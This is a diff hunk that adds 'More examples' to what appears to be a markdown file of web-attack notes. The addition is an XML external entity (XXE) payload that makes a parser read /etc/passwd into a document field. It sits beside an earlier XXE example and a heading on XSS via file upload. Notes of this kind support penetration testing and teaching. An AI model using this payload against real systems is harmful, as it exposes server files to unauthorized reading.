@@ -420,6 +420,15 @@ https://www.youtube.com/watch?v=aQFG-97f900
 &xxe;
 </field3>
 </root>
+
+More examples
+
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
+<root>
+	<table_num>2</table_num>
+	<food>&test;</food>
+</root>
 ```
 
 ### xss via file upload
